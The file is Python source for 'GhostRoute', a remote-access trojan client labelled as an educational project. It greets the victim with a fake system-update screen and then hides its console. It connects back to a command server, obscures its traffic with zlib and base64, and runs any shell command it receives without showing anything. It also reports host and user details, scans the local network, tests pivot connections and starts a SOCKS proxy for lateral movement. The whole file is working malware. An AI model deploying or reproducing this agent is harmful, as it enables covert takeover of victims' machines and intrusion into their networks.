#!/usr/bin/env python3
"""
GhostRoute - Ghost Agent (Client)
Pivot + SOCKS Proxy Deployment
Educational Project - Cyber Security

Features:
- Silent execution (no console window)
- Encrypted communication (zlib + base64)
- Legitimate-looking interface
- Auto-hide console
- Network scanning
- Pivoting
- SOCKS proxy deployment
"""

import socket
import subprocess
import time
import json
import os
import sys
import platform
import threading
import zlib
import base64

# ==================== إخفاء النافذة ====================

def hide_console():
    """إخفاء نافذة CMD على ويندوز."""
    if os.name == 'nt':
        try:
            import ctypes
            ctypes.windll.user32.ShowWindow(
                ctypes.windll.kernel32.GetConsoleWindow(), 0
            )
        except:
            pass

# ==================== الواجهة الشرعية ====================

def show_legitimate_interface():
    """عرض واجهة شرعية للضحية."""
    try:
        print("""
==========================================
   System Update Utility v2.1
   Copyright (c) 2025 - All Rights Reserved
==========================================

[+] Checking for updates...
[+] Downloading update package...
[+] Installing updates...
[+] Update completed successfully!

[+] Your system is up to date.
[+] You can close this window now.
""")
        time.sleep(3)
        hide_console()
    except:
        pass

# ==================== التشفير ====================

def encrypt_message(message):
    """تشفير رسالة."""
    try:
        compressed = zlib.compress(message.encode("utf-8"))
        return base64.b64encode(compressed).decode("ascii")
    except:
        return base64.b64encode(message.encode("utf-8")).decode("ascii")

def decrypt_message(encrypted):
    """فك تشفير رسالة."""
    try:
        compressed = base64.b64decode(encrypted.encode("ascii"))
        return zlib.decompress(compressed).decode("utf-8")
    except:
        try:
            return base64.b64decode(encrypted.encode("ascii")).decode("utf-8")
        except:
            return ""

# ==================== قراءة الإعدادات ====================

def load_agent_config():
    """قراءة إعدادات العميل."""
    config = {
        "server_host": "127.0.0.1",
        "server_port": 4444,
        "interval": 30,
        "timeout": 60,
        "reconnect_delay": 3
    }
    
    config_file = "agent_config.json"
    if os.path.exists(config_file):
        try:
            with open(config_file, "r", encoding="utf-8") as f:
                file_config = json.load(f)
                config.update(file_config)
        except:
            pass
    
    return config

# ==================== فئة العميل ====================

class GhostAgent:
    """عميل GhostRoute."""
    
    def __init__(self, server_host, server_port, interval=30, timeout=60, reconnect_delay=3):
        self.server_host = server_host
        self.server_port = server_port
        self.interval = interval
        self.timeout = timeout
        self.reconnect_delay = reconnect_delay
        self.running = True
        self.socks_thread = None
    
    def connect(self):
        """محاولة الاتصال بالخادم."""
        while self.running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(self.timeout)
                sock.connect((self.server_host, self.server_port))
                return sock
            except:
                time.sleep(self.reconnect_delay)
        return None
    
    def send_encrypted(self, sock, message):
        """إرسال رسالة مشفرة."""
        try:
            encrypted = encrypt_message(message)
            sock.send((encrypted + "\n").encode("utf-8"))
            return True
        except:
            return False
    
    def receive_decrypted(self, sock):
        """استقبال رسالة مشفرة."""
        try:
            data = sock.recv(8192)
            if not data:
                return None
            
            decrypted = decrypt_message(data.decode("utf-8", errors="ignore").strip())
            return decrypted
        except:
            return None
    
    def get_system_info(self):
        """جمع معلومات النظام."""
        info = {
            "hostname": platform.node(),
            "os": platform.system(),
            "os_version": platform.version(),
            "architecture": platform.machine(),
            "python_version": platform.python_version(),
            "user": os.getlogin() if hasattr(os, 'getlogin') else "unknown"
        }
        return json.dumps(info)
    
    def execute_command(self, command):
        """تنفيذ أمر بصمت."""
        try:
            creationflags = 0
            if os.name == 'nt':
                creationflags = 0x08000000
            
            result = subprocess.run(
                command,
                shell=True,
                capture_output=True,
                text=True,
                timeout=self.timeout,
                creationflags=creationflags
            )
            output = result.stdout + result.stderr
            return output if output.strip() else "(no output)"
        except subprocess.TimeoutExpired:
            return "(command timed out)"
        except Exception as e:
            return f"(error: {e})"
    
    def scan_network(self):
        """اكتشاف الأجهزة."""
        system = platform.system().lower()
        
        if system == "windows":
            cmd = "ipconfig && arp -a"
        else:
            cmd = "ifconfig && arp -a || ip addr && arp -a"
        
        output = self.execute_command(cmd)
        return f"SCAN_RESULT:\n{output}"
    
    def perform_pivot(self, target_ip, target_port):
        """محاولة التوجيه."""
        try:
            pivot_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            pivot_sock.settimeout(10)
            pivot_sock.connect((target_ip, target_port))
            pivot_sock.close()
            return f"PIVOT_RESULT:\n[+] Successfully connected to {target_ip}:{target_port}"
        except socket.timeout:
            return f"PIVOT_RESULT:\n[!] Timeout connecting to {target_ip}:{target_port}"
        except ConnectionRefusedError:
            return f"PIVOT_RESULT:\n[!] Connection refused by {target_ip}:{target_port}"
        except Exception as e:
            return f"PIVOT_RESULT:\n[!] Pivot failed: {e}"
    
    def deploy_socks(self, port):
        """نشر SOCKS Proxy."""
        try:
            if self.socks_thread and self.socks_thread.is_alive():
                return f"SOCKS_RESULT:\n[!] SOCKS already running on port {port}"
            
            self.socks_thread = threading.Thread(target=self._run_socks, args=(port,), daemon=True)
            self.socks_thread.start()
            return f"SOCKS_RESULT:\n[+] SOCKS proxy deployed on port {port}"
        except Exception as e:
            return f"SOCKS_RESULT:\n[!] Failed to deploy SOCKS: {e}"
    
    def _run_socks(self, port):
        """تشغيل خادم SOCKS."""
        try:
            socks_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            socks_server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            socks_server.bind(("0.0.0.0", port))
            socks_server.listen(5)
            
            while self.running:
                try:
                    client, addr = socks_server.accept()
                    threading.Thread(target=self._handle_socks_client, args=(client,), daemon=True).start()
                except OSError:
                    break
        except:
            pass
    
    def _handle_socks_client(self, client_socket):
        """التعامل مع اتصال SOCKS."""
        try:
            client_socket.settimeout(10)
            data = client_socket.recv(4096)
            
            if data and len(data) >= 2 and data[0] == 0x05:
                client_socket.send(b"\x05\x00")
                
                data = client_socket.recv(4096)
                if data and len(data) >= 7 and data[0] == 0x05:
                    if data[3] == 0x01:
                        target_ip = socket.inet_ntoa(data[4:8])
                        target_port = int.from_bytes(data[8:10], 'big')
                        
                        remote_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        remote_socket.connect((target_ip, target_port))
                        
                        client_socket.send(b"\x05\x00\x00\x01" + socket.inet_aton("0.0.0.0") + b"\x00\x00")
                        
                        self._pipe(client_socket, remote_socket)
        except:
            pass
        finally:
            client_socket.close()
    
    def _pipe(self, sock1, sock2):
        """تحويل البيانات."""
        def forward(source, destination):
            try:
                while True:
                    data = source.recv(4096)
                    if not data:
                        break
                    destination.send(data)
            except:
                pass
        
        thread1 = threading.Thread(target=forward, args=(sock1, sock2), daemon=True)
        thread2 = threading.Thread(target=forward, args=(sock2, sock1), daemon=True)
        thread1.start()
        thread2.start()
        thread1.join(timeout=60)
        thread2.join(timeout=60)
    
    def handle_message(self, message):
        """معالجة رسالة."""
        if message.startswith("CMD:"):
            cmd = message[4:]
            output = self.execute_command(cmd)
            return f"CMD_RESULT:\n{output}"
        
        elif message == "SCAN_NETWORK":
            return self.scan_network()
        
        elif message.startswith("PIVOT:"):
            parts = message.split(":")
            if len(parts) >= 3:
                return self.perform_pivot(parts[1], int(parts[2]))
            return "PIVOT_RESULT:\n[!] Invalid command"
        
        elif message.startswith("SOCKS:"):
            parts = message.split(":")
            if len(parts) >= 2:
                return self.deploy_socks(int(parts[1]))
            return "SOCKS_RESULT:\n[!] Invalid command"
        
        elif message == "GET_INFO":
            return f"INFO:{self.get_system_info()}"
        
        elif message == "EXIT":
            self.running = False
            return "CMD_RESULT:\n[+] Agent stopped"
        
        else:
            output = self.execute_command(message)
            return f"CMD_RESULT:\n{output}"
    
    def run(self):
        """الدورة الرئيسية."""
        while self.running:
            sock = self.connect()
            
            if sock:
                try:
                    sys_info = self.get_system_info()
                    self.send_encrypted(sock, f"INFO:{sys_info}")
                    
                    while self.running:
                        message = self.receive_decrypted(sock)
                        if message is None:
                            break
                        
                        if message:
                            response = self.handle_message(message)
                            if response:
                                self.send_encrypted(sock, response)
                            
                            if message == "EXIT":
                                self.running = False
                                break
                except:
                    pass
                finally:
                    sock.close()
            
            if self.running:
                time.sleep(self.interval)

# ==================== الدالة الرئيسية ====================

def main():
    """الدالة الرئيسية."""
    # عرض الواجهة الشرعية
    show_legitimate_interface()
    
    # قراءة الإعدادات
    config = load_agent_config()
    
    # إنشاء العميل
    agent = GhostAgent(
        config["server_host"],
        config["server_port"],
        config.get("interval", 30),
        config.get("timeout", 60),
        config.get("reconnect_delay", 3)
    )
    
    # تشغيل العميل
    agent.run()

if __name__ == "__main__":
    main()